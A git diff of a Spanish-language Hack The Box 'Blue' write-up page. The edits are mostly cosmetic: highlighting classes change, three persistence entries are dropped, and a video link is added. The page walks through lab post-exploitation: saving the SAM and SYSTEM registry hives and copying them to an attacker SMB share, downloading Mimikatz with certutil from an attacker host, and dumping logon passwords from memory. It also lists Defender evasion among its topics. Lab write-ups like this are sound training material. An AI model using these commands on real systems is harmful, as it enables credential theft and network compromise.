@@ -12,9 +12,6 @@
   <li>Obtaining credentials stored in memory [MIMIKATZ + Windows Defender Evasion] (EXTRA)</li>
   <li>Enabling RDP from CrackMapExec (EXTRA)</li>
   <li>Windows Persistence techniques (EXTRA)</li>
-  <li>Windows Persistence - Playing with debugger [When a user opens a program] (EXTRA)</li>
-  <li>Windows Persistence - Playing with Gflags [When a user closes a program] (EXTRA)</li>
-  <li>Windows Persistence - Playing with WMI Events [Executing tasks at regular intervals of time] (EXTRA)</li>
   <li>Persistence + Windows Defender Evasion [Playing with Ebowla] (EXTRA)</li>
 </ul>
 
@@ -117,7 +114,7 @@
 
 <p>Una vez con acceso a la maquina verificamos que tipo de usuario somos</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">whoami</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">whoami</span><span class="w">
 </span></code></pre></div></div>
 
 <p><img src="/assets/images/htb-writeup-blue/whoami.png" alt="whoami.png" /></p>
@@ -142,23 +139,23 @@
 
 <p>Como extra nos dirigiremos al directorio Temp</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">cd</span><span class="w"> </span><span class="nx">Windows\Temp</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">Windows\Temp</span><span class="w">
 </span></code></pre></div></div>
 
 <p>Nos crearemos un directorio llamado PostExploitation</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">mkdir</span><span class="w"> </span><span class="nx">PostExploitation</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mkdir</span><span class="w"> </span><span class="nx">PostExploitation</span><span class="w">
 </span></code></pre></div></div>
 
 <p>luego entramos en ese directorio</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">cd</span><span class="w"> </span><span class="nx">PostExploitation</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">PostExploitation</span><span class="w">
 </span></code></pre></div></div>
 
 <p>El recurso sam y system normalmente están en uso por el sistema, el siguiente paso seria crear una copia de estos. Como poseemos máximos privilegios lo hacemos de la siguiente manera</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\system</span><span class="w"> </span><span class="nx">system.backup</span><span class="w">
-</span><span class="nf">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\sam</span><span class="w"> </span><span class="nx">sam.backup</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\system</span><span class="w"> </span><span class="nx">system.backup</span><span class="w">
+</span><span class="n">reg</span><span class="w"> </span><span class="nx">save</span><span class="w"> </span><span class="nx">HKLM\sam</span><span class="w"> </span><span class="nx">sam.backup</span><span class="w">
 </span></code></pre></div></div>
 
 <p><img src="/assets/images/htb-writeup-blue/sam_y_system.png" alt="sam y system.png" /></p>
@@ -172,8 +169,8 @@
 
 <p>Para pasar los archivos utilizamos el siguiente comando en la maquina victima</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">copy</span><span class="w"> </span><span class="nx">sam.backup</span><span class="w"> </span><span class="nx">\\10.10.14.9\smbFolder\sam</span><span class="w">
-</span><span class="nf">copy</span><span class="w"> </span><span class="nx">system.backup</span><span class="w"> </span><span class="nx">\\10.10.14.9\smbFolder\system</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">copy</span><span class="w"> </span><span class="nx">sam.backup</span><span class="w"> </span><span class="nx">\\10.10.14.9\smbFolder\sam</span><span class="w">
+</span><span class="n">copy</span><span class="w"> </span><span class="nx">system.backup</span><span class="w"> </span><span class="nx">\\10.10.14.9\smbFolder\system</span><span class="w">
 </span></code></pre></div></div>
 
 <p>En este caso lo copiaremos a nuestro equipo solo como sam y haremos lo mismo para system.</p>
@@ -241,9 +238,9 @@ payload_type <span class="o">=</span> EXE
 
 <p>Desde la maquina victima tomaremos las variables de entorno con los siguientes comandos</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">username</span><span class="o">%</span><span class="w">
-</span><span class="nf">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">computername</span><span class="o">%</span><span class="w">
-</span><span class="nf">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">homepath</span><span class="o">%</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">username</span><span class="o">%</span><span class="w">
+</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">computername</span><span class="o">%</span><span class="w">
+</span><span class="n">echo</span><span class="w"> </span><span class="o">%</span><span class="nx">homepath</span><span class="o">%</span><span class="w">
 </span></code></pre></div></div>
 
 <p>Y así para cada una una de las variables de entorno, recordemos que si una no la reporta no la ponemos para evitar problemas, también cuando mas variables de entorno coloquemos mejor, pero no necesitamos colocarlas todas.</p>
@@ -279,7 +276,7 @@ payload_type <span class="o">=</span> EXE
 
 <p>Ahora nos descargamos el archivo desde la maquina victima haciendo uso de certutil</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">certutil.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nx">http://10.10.14.9/mimi.exe</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">certutil.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nt">-urlcache</span><span class="w"> </span><span class="o">-split</span><span class="w"> </span><span class="nx">http://10.10.14.9/mimi.exe</span><span class="w">
 </span></code></pre></div></div>
 
 <p><img src="/assets/images/htb-writeup-blue/download_file.png" alt="download file.png" /></p>
@@ -288,7 +285,7 @@ payload_type <span class="o">=</span> EXE
 
 <p>Ahora a ejecutar nuestro archivo</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">mimi.exe</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimi.exe</span><span class="w">
 </span></code></pre></div></div>
 
 <p><img src="/assets/images/htb-writeup-blue/mimikatz.png" alt="mimikatz.png" /></p>
@@ -297,7 +294,7 @@ payload_type <span class="o">=</span> EXE
 
 <p>Lo hacemos de la siguiente manera</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">privilege::debug</span><span class="w">
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">privilege::debug</span><span class="w">
 </span><span class="nx">sekurlsa::logonPasswords</span><span class="w">
 </span></code></pre></div></div>
 
@@ -307,4 +304,7 @@ payload_type <span class="o">=</span> EXE
 
 <p>Hay que tener en cuenta que a veces en entornos empresariales comprometes un equipo no privilegiado pero en la memoria consigues las credenciales de un administrador del dominio, y esto es importante ya que con esto tenemos acceso a todos los equipos de la red.</p>
 
-<p>Listo con esto tendríamos varias maneras y caminos los cuales nos servirán mucho para otras maquinas, recuerden que la practica hace al maestro</p>
+<p>Listo con esto tendríamos varias maneras y caminos los cuales nos servirán mucho para otras máquinas, recuerden que la practica hace al maestro.</p>
+
+<p>Les dejo la resolución de la misma por s4vitar <a href="https://www.youtube.com/watch?v=92XycxcAXkI">Ver video</a></p>
+
